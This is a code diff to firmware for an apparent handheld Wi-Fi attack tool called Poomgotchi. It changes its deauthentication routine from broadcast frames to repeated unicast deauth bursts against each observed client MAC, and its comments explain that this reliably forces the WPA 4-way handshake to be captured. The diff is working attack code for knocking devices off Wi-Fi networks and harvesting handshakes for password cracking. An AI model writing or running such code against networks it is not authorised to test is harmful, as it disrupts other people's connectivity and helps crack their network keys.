@@ -32,7 +32,8 @@
 #define POOMGOTCHI_ASSIST_WAIT_MS     (6000U)
 #define POOMGOTCHI_DEAUTH_MIN_MS      (10000U)
 #define POOMGOTCHI_DIAG_MS            (2000U)  /* [PG] capture diagnostics throttle (issue #45) */
-#define POOMGOTCHI_DEAUTH_BURST       (5U)     /* frames per nudge; one frame rarely forces a 4-way (#45) */
+#define POOMGOTCHI_DEAUTH_BURST       (5U)     /* repeats per nudge; one frame rarely forces a 4-way (#45) */
+#define POOMGOTCHI_DEAUTH_CLIENTS     (4U)     /* max observed client MACs to unicast-deauth per nudge (#45) */
 #define POOMGOTCHI_HEADER_H           (11)
 #define POOMGOTCHI_BOX_Y              (12)
 #define POOMGOTCHI_BOX_H              (40)
@@ -478,19 +479,32 @@ static bool poomgotchi_send_deauth_(void)
 {
     wifi_ap_record_t *target = poomgotchi_target_();
 
+    uint8_t clients[POOMGOTCHI_DEAUTH_CLIENTS][6];
+    size_t n_clients;
+
     if((s_policy == POOMGOTCHI_POLICY_OFF) || !s_capture_running ||
        (target == NULL) || !poomgotchi_deauth_allowed_()) return false;
-    /* Fire a short burst, not a single frame: one broadcast deauth rarely knocks
-     * a client off, but a 5-frame burst reliably forces the 4-way handshake
-     * (matches the proven WiFi Detect burst-deauth behaviour) (issue #45). */
-    for(uint8_t i = 0U; i < POOMGOTCHI_DEAUTH_BURST; ++i) {
-        poom_wifi_attacks_broadcast_once(target);
+
+    n_clients = poom_pcap_manager_wifi_handshake_get_clients(clients, POOMGOTCHI_DEAUTH_CLIENTS);
+
+    /* Unicast burst to each observed client. A broadcast deauth is widely ignored
+     * by clients and APs; a unicast burst (the mechanism the WiFi Detect option
+     * uses) actually forces the 4-way handshake. Fall back to broadcast only when
+     * no client MAC has been observed yet (issue #45). */
+    for(uint8_t rep = 0U; rep < POOMGOTCHI_DEAUTH_BURST; ++rep) {
+        if(n_clients > 0U) {
+            for(size_t c = 0U; c < n_clients; ++c) {
+                poom_wifi_attacks_deauth_client_once(target, clients[c]);
+            }
+        } else {
+            poom_wifi_attacks_broadcast_once(target);
+        }
         vTaskDelay(pdMS_TO_TICKS(20));
     }
     s_last_deauth_ms = poomgotchi_now_ms_();
     ++s_stats.deauths;
-    printf("[PG] deauth burst x%u (policy=%s)\n",
-           (unsigned)POOMGOTCHI_DEAUTH_BURST, poomgotchi_policy_label_());
+    printf("[PG] deauth burst x%u -> %u client(s) (policy=%s)\n",
+           (unsigned)POOMGOTCHI_DEAUTH_BURST, (unsigned)n_clients, poomgotchi_policy_label_());
     poomgotchi_request_render_();
     return true;
 }
